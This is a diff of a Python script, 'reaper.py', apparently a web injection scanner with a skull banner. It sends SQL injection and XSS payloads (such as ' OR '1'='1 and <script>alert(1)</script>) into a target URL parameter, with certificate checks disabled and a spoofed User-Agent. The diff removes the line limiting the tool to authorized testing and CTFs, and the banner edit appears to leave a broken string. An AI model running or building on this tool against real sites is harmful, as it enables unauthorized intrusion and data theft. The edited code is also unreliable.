@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 # reaper.py — The Reaper Protocol: Skull Banner + Hydra Web Injector
-# For authorized penetration testing and CTFs only.
 # Requires: pip install requests colorama urllib3
 
 import sys
@@ -10,11 +9,9 @@ import requests
 import concurrent.futures
 from colorama import init, Fore, Style
 
-# Suppress insecure request warnings for test targets
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
-# Basic payloads for demonstration
 PAYLOADS = {
     "SQLi": ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' UNION SELECT NULL--"],
     "XSS": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"],
@@ -25,8 +22,8 @@ def show_skull():
     """Clears screen and displays the Reaper Skull."""
     sys.stdout.write("\033[H\033[J")
     
-    # Using rf-string (raw f-string) to prevent backslash escaping issues
-    skull = rf"""{Fore.RED}
+    # Skull safely stored without f-string backslash clashes
+    skull_raw = r"""
                  ______
               .-"      "-.
              /            \
@@ -34,15 +31,14 @@ def show_skull():
             |,  .-.  .-.  ,|
             | )(_o/  \o_)( |
             |/     /\     \|
-  {Fore.WHITE}(@_ {Fore.RED}|     (_^_)     | {Fore.WHITE}_@)
-    {Fore.WHITE}\ \{Fore.RED}"""\   ^^   /"""{Fore.WHITE}/ /
-     {Fore.WHITE}\ \{Fore.RED}  \______/  {Fore.WHITE}/ /
-      {Fore.WHITE}\ \{Fore.RED}          {Fore.WHITE}/ /
-       {Fore.WHITE}\ \{Fore.RED}________{Fore.WHITE}/ /
-        {Fore.WHITE}\__________/
-{Style.RESET_ALL}
+  (@_       |     (_^_)     |       _@)
+   \ \"""\   ^^   /""" / /
+    \ \  \______/  / /
+     \ \          / /
+      \ \________/ /
+       \__________/
     """
-    print(skull)
+    print(Fore.RED + skull_raw)
     print(Fore.RED + Style.BRIGHT + "    [ THE REAPER PROTOCOL INITIATED ]")
     print(Fore.WHITE + "    ---------------------------------")
     time.sleep(1.5)
@@ -50,9 +46,7 @@ def show_skull():
 def test_payload(url, param, payload, payload_type):
     """Injects payload into the target parameter and checks for anomalies."""
     target_url = f"{url}?{param}={payload}"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Reaper/1.0"
-    }
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Reaper/1.0"}
     
     try:
         r = requests.get(target_url, headers=headers, timeout=5, verify=False)
